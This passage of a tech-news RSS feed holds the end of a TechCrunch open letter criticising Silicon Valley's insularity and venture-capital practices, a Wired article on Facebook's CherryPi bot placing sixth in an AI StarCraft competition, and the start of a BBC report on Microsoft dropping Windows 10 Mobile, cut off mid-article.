100vw, 2000px&quot;/&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;Courtesy of HBO and “Silicon Valley”&lt;/p&gt;
&lt;/div&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;strong&gt;&lt;span lang=&quot;EN&quot;&gt;Your ideas are only as good as the people in the room. And your door is shut to most people.&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span lang=&quot;EN&quot;&gt; &lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;As evidenced by the major backlash over the recent launch of a company called Bodega — where the founders and investors genuinely didn’t understand why the name was problematic — you don’t always have the best handle on how your ideas will be received outside of the Silicon Valley bubble. You’ve got major blind spots.&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;Why might this be? Face the facts: When Silicon Valley investors are considering new ideas, you don’t have very many different perspectives around the table. More than 90 percent of the decision-makers in the venture capital industry are white men.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;You’ve known this is a problem for a while, but haven’t done anything to fix it: Less than 5 percent of the new ideas that get funding are founded by women, and less than 1 percent of venture funding goes to Latinos and African-Americans.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;You’ve concentrated capital in the hands of a few people (nearly all white guys) who have huge power to determine which people, places and industries get funding. And your decision-makers are often (unintentionally) overlooking ideas that come from people who aren’t like them, which exacerbates gender, racial and geographic divides in our country. Much worse, this financial privilege creates power dynamics that lead to too-frequent cases of &lt;a target=&quot;_blank&quot; href=&quot;https://techcrunch.com/2017/08/21/proposed-bill-targets-sexual-harassment-in-venture-capital-industry/&quot; rel=&quot;noopener&quot;&gt;investors sexually harassing founders&lt;/a&gt; or &lt;a target=&quot;_blank&quot; href=&quot;https://www.eater.com/2017/9/13/16302386/bodega-startup-corner-store-silicon-valley&quot; rel=&quot;noopener&quot;&gt;tone-deaf ideas like Bodega&lt;/a&gt;.&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div id=&quot;attachment_1511708&quot; class=&quot;wp-caption alignnone&quot; readability=&quot;32&quot;&gt;&lt;img class=&quot;wp-image-1511708&quot; src=&quot;https://tctechcrunch2011.files.wordpress.com/2017/07/investor-founder-sexual-harassment-policy-newsletter.jpg?w=772&amp;amp;h=434&quot; alt=&quot;&quot; width=&quot;772&quot; height=&quot;434&quot; srcset=&quot;https://tctechcrunch2011.files.wordpress.com/2017/07/investor-founder-sexual-harassment-policy-newsletter.jpg 640w, https://tctechcrunch2011.files.wordpress.com/2017/07/investor-founder-sexual-harassment-policy-newsletter.jpg?w=150&amp;amp;h=84 150w, https://tctechcrunch2011.files.wordpress.com/2017/07/investor-founder-sexual-harassment-policy-newsletter.jpg?w=300&amp;amp;h=169 300w&quot; sizes=&quot;(max-width: 772px) 100vw, 772px&quot;/&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;Image courtesy of Bryce Durbin&lt;/p&gt;
&lt;/div&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;strong&gt;&lt;span&gt;Your rainforest of innovation has turned into a factory farm.&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;Silicon Valley, perhaps your greatest achievement is that you’ve built a community where the little guy could build a great company to disrupt the establishment. Silicon Valley’s innovation engine has been driven by the creation of iconic companies — HP, Intel, Apple, Google, Facebook — that took on bigger competitors.&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;But that’s changing. In his famous book &lt;em&gt;Zero to One&lt;/em&gt;, Peter Thiel writes, “Competition is for losers. Be a monopoly.” And that philosophy has come to prevail — the average venture capitalist would say that in a portfolio of 20, they are OK with 19 losers and one grand slam. Follow that to its logical conclusion: for every billionaire Peter Thiel, Silicon Valley, you’re OK with 19 broke people. It’s no wonder that inequality is at a 100-year high, entrepreneurial activity is at a 40-year low and eight men control half the world’s wealth.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;Over the past 15 years, big has crushed little in Silicon Valley, to an increasing degree. The former giant-slayers like Apple and Google have become giants themselves, shutting out or buying up new entrants.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;The worst of it: you’re even controlling which ideas get out there — as we saw when Google chairman Eric Schmidt complained to the New America Foundation for criticizing the company’s monopolistic practices. &lt;a target=&quot;_blank&quot; href=&quot;https://www.nytimes.com/2017/08/30/us/politics/eric-schmidt-google-new-america.html?mcubz=1&amp;amp;_r=0&quot; rel=&quot;noopener&quot;&gt;The entire team got fired&lt;/a&gt;.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;In short, your present leaders are cannibalizing your future. If a startup is raising money today, one of the first questions they’ll be asked is, “What’s your exit strategy?” Specifically, that means, “Whom among Google, Facebook and a few other companies will acquire you?” A few tech giants are dictating which problems founders want to work on, and how we’ll solve them.&lt;/span&gt;&lt;/p&gt;

&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;The result? You haven’t produced a new firm that has cracked the world’s top 200 since Facebook’s founding in 2003.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone wp-image-1287229 size-full&quot; src=&quot;https://tctechcrunch2011.files.wordpress.com/2016/03/ouroborous.jpg?w=5417&amp;amp;h=3750&quot; alt=&quot;&quot; width=&quot;5417&quot; height=&quot;3750&quot; srcset=&quot;https://tctechcrunch2011.files.wordpress.com/2016/03/ouroborous.jpg 5417w, https://tctechcrunch2011.files.wordpress.com/2016/03/ouroborous.jpg?w=150&amp;amp;h=104 150w, https://tctechcrunch2011.files.wordpress.com/2016/03/ouroborous.jpg?w=300&amp;amp;h=208 300w, https://tctechcrunch2011.files.wordpress.com/2016/03/ouroborous.jpg?w=768&amp;amp;h=532 768w, https://tctechcrunch2011.files.wordpress.com/2016/03/ouroborous.jpg?w=680&amp;amp;h=471 680w&quot; sizes=&quot;(max-width: 5417px) 100vw, 5417px&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;strong&gt;&lt;span&gt;Your insulation makes tomorrow’s problems harder to solve.&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;Your leaders are increasingly coming from a narrower group of universities, companies and socioeconomic classes. Your companies are now solving “my-world problems” (food delivery, cold-pressed on-demand juice) versus the “real-world problems” you used to solve (getting affordable computers in the hands of everyone; inventing the internet). Your solutions literally create the script for a satire show on HBO — and you don’t see what a big problem it is.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;And because of the first problem — the lack of new ideas in the room — you don’t know how to solve this. Your best idea for social inequality: universal basic income, where the wealth of the billionaires will continue to grow, but don’t worry, the rest of the serfs (who are otherwise unable to do any work!) will receive a daily stipend.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;To you, in the words of one Silicon Valley investor, this seems like “the only logical conclusion.” To the average person, this seems like the height of arrogance. People are uncomfortable with universal basic income because you’re essentially saying their labor isn’t worth anything — but you don’t see it!&lt;/span&gt;&lt;/p&gt;
&lt;div id=&quot;attachment_1426325&quot; class=&quot;wp-caption alignnone&quot; readability=&quot;32&quot;&gt;&lt;img class=&quot;wp-image-1426325 size-full&quot; src=&quot;https://tctechcrunch2011.files.wordpress.com/2016/12/robot-blinders-alt.png?w=2560&amp;amp;h=1440&quot; alt=&quot;&quot; width=&quot;2560&quot; height=&quot;1440&quot; srcset=&quot;https://tctechcrunch2011.files.wordpress.com/2016/12/robot-blinders-alt.png 2560w, https://tctechcrunch2011.files.wordpress.com/2016/12/robot-blinders-alt.png?w=150&amp;amp;h=84 150w, https://tctechcrunch2011.files.wordpress.com/2016/12/robot-blinders-alt.png?w=300&amp;amp;h=169 300w, https://tctechcrunch2011.files.wordpress.com/2016/12/robot-blinders-alt.png?w=768&amp;amp;h=432 768w, https://tctechcrunch2011.files.wordpress.com/2016/12/robot-blinders-alt.png?w=680&amp;amp;h=383 680w&quot; sizes=&quot;(max-width: 2560px) 100vw, 2560px&quot;/&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;Image courtesy of Bryce Durbin&lt;/p&gt;
&lt;/div&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span&gt;&lt;strong&gt;So, what can you do about it?&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;Maybe I was a little harsh on you when I said you didn’t see any of this happening: We’ve seen the beginnings of conversations around diversity and inclusion, and mea culpas have recently been flying out of your board rooms as fast as rejection e-mails.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;So now that you’re paying attention, what can you do? Here are a few ideas:&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1CxSpMiddle&quot;&gt;&lt;strong&gt;Put as much attention into finding founders as you do deal flow.&lt;/strong&gt;&lt;span lang=&quot;EN&quot;&gt; Your leaders talk a lot about investing in diverse companies; well, that won’t be easy unless you invest in the infrastructure to find them. We spend billions of dollars to make sure that the best high school and college athletes have their shot at the pros; why don’t we do the same for entrepreneurs? Instead of asking entrepreneurs for a “warm introduction,” build technology that actively encourages cold calls and outreach from founders — and can help them.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1CxSpMiddle&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;(I’m particularly inspired by a firm, Backstage Capital, that intentionally invests in what founder Arlan Hamilton calls under-estimated founders; one of their metrics of success is the percentage of cold-emails that they fund.)&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1CxSpMiddle&quot;&gt;&lt;strong&gt;Create conditions for the little guy to thrive.&lt;/strong&gt;&lt;span lang=&quot;EN&quot;&gt; Think about &lt;em&gt;how&lt;/em&gt; you invest as well as &lt;em&gt;what&lt;/em&gt; you invest in. There’s a real problem with equity investing as a one-size-fits-all model in Silicon Valley; explore alternate models like revenue-sharing, which encourages companies to build for lasting success, not acquisition (&lt;a target=&quot;_blank&quot; href=&quot;https://medium.com/village-capital/why-an-equity-only-investment-strategy-overlooks-many-promising-entrepreneurs-ec5f69bd104c&quot; rel=&quot;noopener&quot;&gt;more on that here&lt;/a&gt;). Or make sure that your unprecedented prosperity is actually shared among the employees. From New Belgium Brewing to Chobani, there are stories across the country of billion-dollar unicorns where employee ownership is shared broadly, helping janitors and factory workers create wealth alongside management.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1CxSpMiddle&quot;&gt;&lt;strong&gt;Recognize that business and society are together — not in separate worlds.&lt;/strong&gt;&lt;span lang=&quot;EN&quot;&gt; You’re full of incredibly generous philanthropists. But the market value of just two companies — Google and Facebook — is more than all the charitable foundations in the world. You need to help lead society in your day job, not just at fundraisers and thought leadership conferences. For all the lip service that Silicon Valley has given to “changing the world,” when ProPublica tried to buy targeted ads for “Jew haters,” Facebook didn’t question whether this was good, or right — they asked them how they’d like to pay for it.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1CxSpMiddle&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;You own the platforms that dominate consumer behavior, and the data that can determine people’s retirements, relationships and decisions — you need to ask “is this the right thing to do?” as often as you ask “what is monetizable?” How can you help small businesses and entrepreneurs thrive as much as they used to 40 years ago? How can you help local journalists keep citizens informed and governments accountable? You’ve connected society — how can you help us be more resilient and sustainable in the face of a dramatically shifting climate?&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1CxSpMiddle&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;I’m encouraged by some early steps. Facebook, for example, is launching a pilot to help local journalism (though I’d go a hundred times further and enable success for all kinds of local businesses). PayPal has used its massive platform and data advantage to lend an incredible $2 billion to small businesses in the last two years — more than most banks. But that’s just a tiny fraction of the talent and resources in the Valley.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;Silicon Valley, there’s still time to regain your image as a positive force in America and the world. Just don’t wait until it’s too late.&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Mon, 09 Oct 2017 14:40:23 +0000</pubDate>
<dc:creator>Caveman_Coder</dc:creator>
<og:title>Dear Silicon Valley: America’s fallen out of love with you</og:title>
<og:description>Silicon Valley, you used to be the envy of the world. Over the last decade I’ve seen countless cities try to become you. In case you haven’t noticed,..</og:description>
<og:image>https://tctechcrunch2011.files.wordpress.com/2017/10/screen-shot-2017-10-08-at-12-29-53-pm.png</og:image>
<og:url>http://social.techcrunch.com/2017/10/08/dear-silicon-valley-americas-fallen-out-of-love-with-you/</og:url>
<og:type>article</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://techcrunch.com/2017/10/08/dear-silicon-valley-americas-fallen-out-of-love-with-you/</dc:identifier>
</item>
<item>
<title>Facebook Quietly Enters StarCraft War for AI Bots</title>
<link>https://www.wired.com/story/facebook-quietly-enters-starcraft-war-for-ai-bots-and-loses/</link>
<guid isPermaLink="true" >https://www.wired.com/story/facebook-quietly-enters-starcraft-war-for-ai-bots-and-loses/</guid>
<description>&lt;p data-reactid=&quot;247&quot;&gt;&lt;span class=&quot;lede&quot; data-reactid=&quot;248&quot;&gt;In the distant&lt;/span&gt; Koprulu Sector of the Milky Way, Facebook’s Zerglings lingered in a restless swarm outside the enemy’s base. After the commander ill-advisedly opened the gate, the social network’s alien horde &lt;a href=&quot;https://youtu.be/lxycpQDeh2o?t=173&quot; target=&quot;_blank&quot; data-reactid=&quot;250&quot;&gt;stormed in&lt;/a&gt; and slaughtered forces stationed inside, in a battle fought on the frontiers of artificial-intelligence research.&lt;/p&gt;
&lt;p data-reactid=&quot;252&quot;&gt;The bloody incident was part of an &lt;a href=&quot;https://www.cs.mun.ca/~dchurchill/starcraftaicomp/&quot; target=&quot;_blank&quot; data-reactid=&quot;254&quot;&gt;annual competition&lt;/a&gt; of the videogame &lt;em data-reactid=&quot;256&quot;&gt;StarCraft&lt;/em&gt; for AI software bots that wrapped up Sunday. Facebook quietly entered a bot called CherryPi designed by eight people employed by or affiliated with its AI research lab.&lt;/p&gt;
&lt;p data-reactid=&quot;258&quot;&gt;The social network’s stealthy space war suggests Facebook is serious about competing with Google and others to set showy new milestones in AI smarts. Google’s London-based DeepMind AI research unit made headlines last year when its AlphaGo software defeated a &lt;a href=&quot;https://www.wired.com/2016/05/google-alpha-go-ai/&quot; data-reactid=&quot;260&quot;&gt;champion at the board game Go&lt;/a&gt;. In August, DeepMind declared &lt;em data-reactid=&quot;262&quot;&gt;StarCraft II&lt;/em&gt;, the latest version of the game, &lt;a href=&quot;https://www.wired.com/story/googles-ai-declares-galactic-war-on-starcraft-/&quot; data-reactid=&quot;264&quot;&gt;as its next target&lt;/a&gt;.&lt;/p&gt;
&lt;p data-reactid=&quot;266&quot;&gt;The contest Facebook entered, like most AI research in the area, used an older version of &lt;em data-reactid=&quot;268&quot;&gt;StarCraft&lt;/em&gt;, which is considered equally difficult for software to master. Facebook’s AI research group, which lists 80 researchers on its website and is led by NYU professor Yann LeCun, has produced many research papers but not notched up an achievement as striking as Google’s with Go. Facebook has released three research papers on StarCraft, but not announced a special effort to conquer the game.&lt;/p&gt;
&lt;p data-reactid=&quot;270&quot;&gt;Final results released Sunday indicate Facebook still has a way to go: CherryPi finished sixth in a field of 28; the top three bots were all made by lone, hobbyist coders.&lt;/p&gt;
&lt;p data-reactid=&quot;271&quot;&gt;Gabriel Synnaeve, a research scientist at Facebook, described CherryPi to WIRED as an &quot;baseline&quot; on which to build future research on &lt;em data-reactid=&quot;273&quot;&gt;StarCraft&lt;/em&gt;. &quot;We wanted to see how it compares to existing bots, and in particular test if it has flaws that need correcting,&quot; he said. CherryPi competed in a long-running contest that is part of &lt;a href=&quot;http://aiide.org&quot; target=&quot;_blank&quot; data-reactid=&quot;275&quot;&gt;AIIDE&lt;/a&gt;, an academic conference on applying AI in entertainment. Facebook also sponsored this year’s contest, paying for hardware used to run the thousands of bot-on-bot games.&lt;/p&gt;

&lt;div class=&quot;inset-left-component inset-left-component--article&quot; data-reactid=&quot;279&quot;&gt;
&lt;h4 class=&quot;inset-left-component__el&quot; data-reactid=&quot;280&quot;&gt;Related Stories&lt;/h4&gt;
&lt;ul class=&quot;inset-left-component--article__list&quot; data-reactid=&quot;281&quot;&gt;&lt;li class=&quot;article-list-item-embed-component__post&quot; data-reactid=&quot;282&quot; readability=&quot;23&quot;&gt;

&lt;div class=&quot;article-list-item-embed-component__description&quot; data-reactid=&quot;288&quot; readability=&quot;32&quot;&gt;
&lt;p&gt;&lt;span data-reactid=&quot;290&quot;&gt;Tom Simonite&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;article-list-item-embed-component__title&quot; data-reactid=&quot;291&quot;&gt;Google's AI Declares Galactic War on &lt;em&gt;StarCraft&lt;/em&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li class=&quot;article-list-item-embed-component__post&quot; data-reactid=&quot;292&quot; readability=&quot;23&quot;&gt;

&lt;div class=&quot;article-list-item-embed-component__description&quot; data-reactid=&quot;298&quot; readability=&quot;32&quot;&gt;
&lt;p&gt;&lt;span data-reactid=&quot;300&quot;&gt;Cade Metz&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;article-list-item-embed-component__title&quot; data-reactid=&quot;301&quot;&gt;What the AI Behind AlphaGo Can Teach Us About Being Human&lt;/p&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li class=&quot;article-list-item-embed-component__post&quot; data-reactid=&quot;302&quot; readability=&quot;23.5&quot;&gt;

&lt;div class=&quot;article-list-item-embed-component__description&quot; data-reactid=&quot;308&quot; readability=&quot;33&quot;&gt;
&lt;p&gt;&lt;span data-reactid=&quot;310&quot;&gt;Tom Simonite&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;article-list-item-embed-component__title&quot; data-reactid=&quot;311&quot;&gt;No, Facebook’s Chatbots Will Not Take Over the World&lt;/p&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;p data-reactid=&quot;312&quot;&gt;Games such as tic-tac-toe, checkers, chess, and Go have been testbeds for new ideas in artificial intelligence since the field’s beginnings in the 1950s. These days, there’s also a serious business purpose, as companies increasingly use AI to hone their product and service offerings. Facebook, Google, and other tech companies use AI to &lt;a href=&quot;https://www.wired.com/story/big-tech-can-use-ai-to-extract-many-more-ad-dollars-from-our-clicks/&quot; data-reactid=&quot;314&quot;&gt;improve ad-targeting&lt;/a&gt; and personalization systems, and enable new products, such as virtual assistants and augmented reality.&lt;/p&gt;
&lt;p data-reactid=&quot;316&quot;&gt;&lt;em data-reactid=&quot;317&quot;&gt;StarCraft&lt;/em&gt; is alluring to AI researchers for more than just the fun of commanding weapons like the building-leveling Yamato plasma cannon. Although the videogame may appear more approachable than Go or chess, it is many times more complex, because players’ pieces and actions aren’t limited to a tightly regimented board and always in full view of their opponent. The number of valid positions on a Go board is a 1 followed by 170 zeros. Researchers estimate that you’d need to add at least 100 more zeros to get into the realm of &lt;em data-reactid=&quot;319&quot;&gt;StarCraft&lt;/em&gt;’s complexity.&lt;/p&gt;
&lt;p data-reactid=&quot;321&quot;&gt;The winning bot in this year’s competition, ZZZKBot, was made by Chris Coxe, a software developer in Perth, Australia, who previously worked for NASDAQ. He built his bot alone, and lately took a break from work in part to dedicate more time to it. A day before the final results were announced, Coxe spoke self-deprecatingly of his handiwork. “It was supposed to be a proof of concept,” he said. “The source code isn’t all that great.”&lt;/p&gt;
&lt;p data-reactid=&quot;322&quot;&gt;Like all &lt;em data-reactid=&quot;324&quot;&gt;StarCraft&lt;/em&gt; bots so far, ZZZKBot wouldn’t last long against even a moderately skilled human &lt;em data-reactid=&quot;326&quot;&gt;StarCraft&lt;/em&gt; player. The feats of planning and memory required to predict and react to the maneuvers of an alien army are beyond today’s software.&lt;/p&gt;


&lt;p data-reactid=&quot;332&quot;&gt;The days of amateurs building the best &lt;em data-reactid=&quot;334&quot;&gt;StarCraft&lt;/em&gt; bots appear to be numbered now that two giant companies that compete in both online ads and AI prowess have taken an interest. David Churchill, a professor at Memorial University of Newfoundland who organized the AIIDE contest, predicts the &lt;em data-reactid=&quot;336&quot;&gt;StarCraft&lt;/em&gt; bot scene is set for a big shake up over the next few years.&lt;/p&gt;
&lt;p data-reactid=&quot;338&quot;&gt;Facebook and Google say they are approaching &lt;em data-reactid=&quot;340&quot;&gt;StarCraft&lt;/em&gt; differently than most individual programmers have. Leading bots are based mostly on rules and strategies specified by their creators. Coxe says one of his bot’s best features is a simple learning feature, in which it tries out pre-programmed strategies against each bot it plays and notes which one works so as to be prepared in their next matchup. The tech giants are planning to lean more heavily on machine learning, planning to have bots develop their own strategies from scratch by examining large caches of data from past games, or repeated experimentation. Facebook didn't build ideas it has published along those lines into CherryPi. Machine learning was central to making Google’s AlphaGo unbeatable.&lt;/p&gt;
&lt;p data-reactid=&quot;342&quot;&gt;Facebook’s bot may not have won the &lt;em data-reactid=&quot;344&quot;&gt;StarCraft&lt;/em&gt; competition, but Dan Gant, whose bot PurpleWave placed second, saw hints of the future in its play. Most bots choose to either attack frontally, or retreat, based on the relative numbers in opposing armies. In videos released from the contest prior to the final results, CherryPi appeared to know when it could move fast enough to sneak around an enemy to attack its base, says Gant.&lt;/p&gt;
&lt;p data-reactid=&quot;346&quot;&gt;Still, don’t expect lone bot builders to disappear overnight—or &lt;em data-reactid=&quot;348&quot;&gt;StarCraft&lt;/em&gt; to be conquered soon. “The problem is still so difficult,” says Churchill. “For a couple of years I predict the hobbyist, mostly rule-based bots, will still do well.” He guesses it may be five years before any bot can beat expert humans—but acknowledges it may be sooner.&lt;/p&gt;
&lt;p data-reactid=&quot;350&quot;&gt;Gant, a software developer in New York, took a break this year and spent months working full-time on PurpleWave. He says the entrance of tech giants adds to the appeal of a pursuit that presents a unique learning opportunity. “You can be Facebook or DeepMind or a kid just learning programming and you’re competing on a level playing field,” he says. “You’re limited by your own effort and what you can teach yourself.”&lt;/p&gt;
&lt;p data-reactid=&quot;351&quot;&gt;Making a superhuman &lt;em data-reactid=&quot;353&quot;&gt;StarCraft&lt;/em&gt; player could deliver tech companies more than just satisfaction. Google says machine learning from DeepMind has helped cut cooling bills in its datacenters. A Microsoft research paper on machine learning this year said that improving predictions of when a user will click on an ad by just 0.1 percent would yield hundreds of millions of dollars in new revenue. A bot capable of leading armies of alien zergs to crush any human might quickly earn its keep.&lt;/p&gt;
</description>
<pubDate>Mon, 09 Oct 2017 11:39:05 +0000</pubDate>
<dc:creator>sus_007</dc:creator>
<og:type>article</og:type>
<og:title>Facebook Quietly Enters StarCraft War for AI Bots, and Loses</og:title>
<og:description>Facebook entered a StarCraft competition for software bots, revealing its ambition to compete with Google in artificial intelligence.</og:description>
<og:image>https://media.wired.com/photos/59d80f79c8a2926f235545a2/191:100/pass/blizzardentertainment-FA.jpg</og:image>
<og:url>https://www.wired.com/story/facebook-quietly-enters-starcraft-war-for-ai-bots-and-loses/</og:url>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.wired.com/story/facebook-quietly-enters-starcraft-war-for-ai-bots-and-loses/</dc:identifier>
</item>
<item>
<title>Microsoft gives up on Windows 10 Mobile</title>
<link>http://www.bbc.co.uk/news/technology-41551546</link>
<guid isPermaLink="true" >http://www.bbc.co.uk/news/technology-41551546</guid>
<description>&lt;figure class=&quot;media-landscape has-caption full-width lead&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                &lt;img class=&quot;js-image-replace&quot; alt=&quot;Windows 10 Mobile phones&quot; src=&quot;https://ichef.bbci.co.uk/news/320/cpsprodpb/587D/production/_98235622_whatsubject.jpg&quot; width=&quot;976&quot; height=&quot;400&quot;/&gt;&lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;Microsoft&lt;/span&gt;
                
            &lt;/span&gt;
            
            &lt;figcaption class=&quot;media-caption&quot;&gt;&lt;span class=&quot;off-screen&quot;&gt;Image caption&lt;/span&gt;
                &lt;span class=&quot;media-caption__text&quot;&gt;
                    Microsoft said creating Windows 10 Mobile phones was not a &quot;focus&quot; for the company
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p class=&quot;story-body__introduction&quot;&gt;Microsoft appears to have abandoned its smartphone operating system ambitions.&lt;/p&gt;&lt;p&gt;The company's Windows 10 chief &lt;a href=&quot;https://twitter.com/joebelfiore/status/917071399541391360&quot; class=&quot;story-body__link-external&quot;&gt;has tweeted that developing&lt;/a&gt; new features and hardware for the Mobile version of the OS was no longer a &quot;focus&quot;.&lt;/p&gt;&lt;p&gt;Joe Belfiore added that he had also switched to Android himself.&lt;/p&gt;&lt;p&gt;Windows 10 Mobile tried to attract users by letting them run the same &quot;universal apps&quot; on both their PCs and handsets, but the concept failed to catch on.&lt;/p&gt;&lt;p&gt;The OS accounted for just 0.03% of the global market - based on smartphone shipments - between April and June, according to research company IDC.&lt;/p&gt;&lt;p&gt;The market intelligence provider said the news had been a long time coming.&lt;/p&gt;&lt;p&gt;&quot;There wasn't a wide range of devices running Windows 10 Mobile, so it wasn't attractive to retailers or operators,&quot; said IDC's Francisco Jeronimo.&lt;/p&gt;&lt;p&gt;&quot;And from a consumer perspective, the operating system didn't provide as good an experience as Android or iOS.&quot;&lt;/p&gt;&lt;figure class=&quot;media-landscape has-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
                 &lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;Getty Images&lt;/span&gt;
                
            &lt;/span&gt;
            
            &lt;figcaption class=&quot;media-caption&quot;&gt;&lt;span class=&quot;off-screen&quot;&gt;Image caption&lt;/span&gt;
                &lt;span class=&quot;media-caption__text&quot;&gt;
                    Mr Belfiore headed up Microsoft's Windows Phone platform before it moved to Windows 10 Mobile
                &lt;/span&gt;
